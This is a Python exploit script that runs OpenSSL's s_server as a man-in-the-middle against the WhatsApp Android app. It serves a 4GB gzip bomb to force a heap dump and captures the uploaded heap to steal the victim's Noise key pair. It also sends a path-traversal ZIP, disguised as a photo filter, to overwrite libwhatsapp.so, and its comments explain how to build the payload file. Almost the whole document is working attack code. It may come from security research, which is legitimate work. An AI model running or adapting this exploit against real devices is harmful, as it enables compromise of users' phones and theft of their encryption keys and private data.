#!/usr/bin/env python
#
# This Python script executes OpenSSL's s_server and communicates with its stdin
# and stdout over pipes.
#
# HTTP requests arriving at s_server are handled by a `BaseHTTPRequestHandler'
# class, the response is written back to OpenSSL's stdin and forwarded to the
# client on the other side.
#
# If you want to implement your own MitM logic, start from here :)
#
# Have a look at README.md for more information on how to use this script.
#
import sys
import os
import io
import subprocess
import selectors
import http.server
import urllib.parse
import urllib.request
import gzip
import tempfile
import hashlib


_HTTP_VERBS = ['OPTIONS', 'HEAD', 'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'CONNECT', 'TRACE']

_OPENSSL_SRC = os.getenv('OPENSSL_SRC')
_SECRETS = os.getenv('SECRETS')



#
# Modified version of the solution found below:
#
# https://stackoverflow.com/q/2115410
#
class HTTPRequestHandler(http.server.BaseHTTPRequestHandler):

    def __init__(self, request, process):
        self.process = process
        self.close_connection = False
        self.client_address = ('127.0.0.1', 31337)
        self.rfile = io.BytesIO(bytes(request, 'utf-8'))
        self.wfile = io.BytesIO()


    def _gzip(self, data):
        return gzip.compress(data, compresslevel=9)


    def _read(self, size):
        fp = self.process.stdout
        data = bytes()
        while len(data) < size:
            data += fp.read(size - len(data))
        return data

    def _readline(self):
        data = bytes()
        while not data.endswith(b'\r\n'):
            data += self._read(1)
        return data


    def _read_chunked_data(self):

        data = bytes()
        try:
            fp = self.process.stdout
            chunk_size = int(self._readline().strip(), 16)
            while chunk_size != 0:
                data += self._read(chunk_size)
                self._read(2)
                chunk_size = int(self._readline().strip(), 16)
            fp.readline()
        except ValueError:
            print('Could not parse chunked-encoded data')

        return data


    def _get_content_length(self):
        try:
            content_length = int(self.headers.get('Content-Length', 0))
        except ValueError:
            content_length = 0
        return content_length


    #
    # Handles the request for the list of WhatsApp stickers. This is what it
    # looks like in real life:
    #
    # https://static.whatsapp.net/sticker?cat=all&lg=en-US&country=GR&ver=2
    #
    # We send back to the victim a very big response (4Gb of gzipped zeros) to
    # make WhatsApp throw an out-of-memory exception. When this happens, a
    # custom out-of-memory handler will kick in, will dump the Java heap and
    # will attempt to upload it to https://crashlogs.whatsapp.net. However,
    # since we have dumped all TLS v1.2 keys from the victim's device, we can
    # perform yet another man-in-the-middle attack and steal the heap contents
    # as well. Examining the leaked heap contents will reveal the victim's Noise
    # key pair along with other useful information.
    #
    # To create the aforementioned gzipped file:
    #
    #     truncate -s 4G blob.bin
    #     gzip --best blob.bin
    #
    def _handle_get_stickers(self):
        print('Client requested sticker information, sending OOM payload')
        data = bytes()
        with open('blob.bin.gz', 'rb') as fp:
            data += fp.read()
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Encoding', 'gzip')
        return data


    #
    # Handles the request for photo filters. This is what it looks like in real
    # life:
    #
    # https://static.whatsapp.net/downloadable?category=filter
    #
    # This is where we send our exploitation payload. WhatsApp downloads and
    # extracts a ZIP file from the above location. By sending a ZIP archive that
    # contains relative paths, we can overwrite files owned by the application.
    # A good candidate for overwriting is "libwhatsapp.so", which is extracted
    # by Facebook's superpack at:
    #
    # /data/data/com.whatsapp/files/decompressed/libs.spk.zst/libwhatsapp.so
    #
    def _handle_get_filters(self):
        print('Client requested downloadable filters, sending ZIP payload')
        data = bytes()
        with open('payload.zip', 'rb') as fp:
            data += fp.read()
            self.send_header('Content-Disposition', 'attachment;filename=filter_en_YHbwxhPS2U4WtSgbh9e47EKR_cmhYwWErgJoiPpIzuQ.zip')
            self.send_header('Content-Type', 'application/zip')
            self.send_header('Content-Encoding', 'identity')
            self.send_header('idhash', 'YHbwxhPS2U4WtSgbh9e47EKR_cmhYwWErgJoiPpIzuQ')
        return data


    #
    # Handles the request for the manifest of downloadable resources. This is
    # what it looks like in real life:
    #
    # https://static.whatsapp.net/downloadable?category=manifest&locale=en&existing_id=RhjSkX-yoTP-Q0I6tS2_3Qo6GIxWv1p0Oq0UA9bTCwA
    #
    # Depending on when the manifest was last fetched, this might or might not
    # be called.
    #
    def _handle_get_manifest(self):
        #
        # To avoid carrying hardcoded manifest contents around, request from
        # upstream and forward to the victim.
        #
        print('Client requested downloadable manifest, forwarding from upstream')
        data = bytes()
        opener = urllib.request.build_opener()
        with opener.open('https://static.whatsapp.net/downloadable?category=manifest&locale=en') as fp:
            data += fp.read()
            self.send_header('Content-Disposition', 'attachment;filename=manifest_en_RhjSkX-yoTP-Q0I6tS2_3Qo6GIxWv1p0Oq0UA9bTCwA.json')
            self.send_header('Content-Type', 'application/json')
            self.send_header('Content-Encoding', 'identity')
            self.send_header('idhash', 'RhjSkX-yoTP-Q0I6tS2_3Qo6GIxWv1p0Oq0UA9bTCwA')
        return data


    def _handle_get(self):

        parts = urllib.parse.urlparse(self.path)
        qs = urllib.parse.parse_qs(parts.query)

        data = bytes()
        if parts.path == '/sticker' and 'all' in qs.get('cat', []):
            data += self._handle_get_stickers()
        elif parts.path == '/downloadable':
            category = qs.get('category', [])
            if 'manifest' in category:
                data += self._handle_get_manifest()
            elif 'filter' in category:
                data += self._handle_get_filters()

        return data


    def _handle_post(self):

        transfer_encoding = self.headers.get('Transfer-Encoding', '').lower()
        content_length = self._get_content_length()

        data = bytes()
        if transfer_encoding == 'chunked':
            data += self._read_chunked_data()
        elif content_length > 0:
            data += self._read(content_length)

        filename = '%s/%s.bin' % (tempfile.gettempdir(), hashlib.md5(data).hexdigest())
        with open(filename, 'wb') as fp:
            fp.write(data)
        print('Received %d bytes, stored in %s' % (len(data), filename))


    # def log_request(self, code='-', size='-'):
    #     pass

    def do_GET(self):
        self.send_response(http.HTTPStatus.OK)
        data = self._handle_get()
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)
        self.wfile.flush()

    def do_POST(self):
        self.send_response(http.HTTPStatus.OK)
        self._handle_post()
        self.send_header('Content-Length', '0')
        self.end_headers()


def process_http_request(request, proc):
    # print('--- Handling request ---')
    # print(request)
    # print('---')
    handler = HTTPRequestHandler(request, proc)
    handler.handle()
    proc.stdin.write(handler.wfile.getbuffer())
    proc.stdin.flush()


def read_http_request(fp):
    request = ''
    for line in fp:
        line = line.decode('utf-8')
        request += line
        if line.rstrip() == '':
            break
    return request


def is_http_request(line):
    return any((line.startswith('%s /' % verb) for verb in _HTTP_VERBS))


def read_stdout(proc):
    line = proc.stdout.readline().decode('utf-8')
    if is_http_request(line):
        request = line
        request += read_http_request(proc.stdout)
        process_http_request(request, proc)
    else:
        print(line.rstrip())


def read_stderr(proc):
    print(proc.stderr.readline().decode('utf-8').rstrip())


def flush_stdin(proc):
    proc.stdin.flush()


def interact(proc):

    selector = selectors.DefaultSelector()
    selector.register(proc.stderr, selectors.EVENT_READ, read_stderr)
    selector.register(proc.stdout, selectors.EVENT_READ, read_stdout)
    # selector.register(proc.stdin, selectors.EVENT_WRITE, flush_stdin)

    try:
        while proc.poll() is None:
            for key, _ in selector.select(timeout=5):
                cb = key.data
                cb(proc)
    except KeyboardInterrupt:
        proc.kill()

    for key, _ in selector.select(timeout=5):
        cb = key.data
        cb(proc)

    selector.close()


def start_server():

    #
    # Set the loader's library path in case OpenSSL was decompiled as a shared
    # library.
    #
    # For ease of use, you can configure OpenSSL as shown below:
    #
    # ./config -d no-shared
    #
    sysname = os.uname().sysname.lower()
    if sysname == 'linux':
        os.putenv('LD_LIBRARY_PATH', _OPENSSL_SRC)
    elif sysname == 'darwin':
        os.putenv('DYLD_LIBRARY_PATH', _OPENSSL_SRC)

    args = [
        '%s/apps/openssl' % _OPENSSL_SRC,
        's_server',
        '-tls1_2',
        '-port', '443',
        '-cert', '%s/cert.pem' % _SECRETS,
        '-key', '%s/key.pem' % _SECRETS,
        '-early_data',
        '-stateless',
        '-no_ticket',
        '-ign_eof'
    ]

    proc = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.PIPE, bufsize=0, close_fds=True)

    interact(proc)


def main(argv):
    if _OPENSSL_SRC is None:
        print('OPENSSL_SRC not set!')
    elif _SECRETS is None:
        print('SECRETS is not set!')
    else:
        start_server()
    return os.EX_OK

if __name__ == '__main__':
    sys.exit(main(sys.argv))

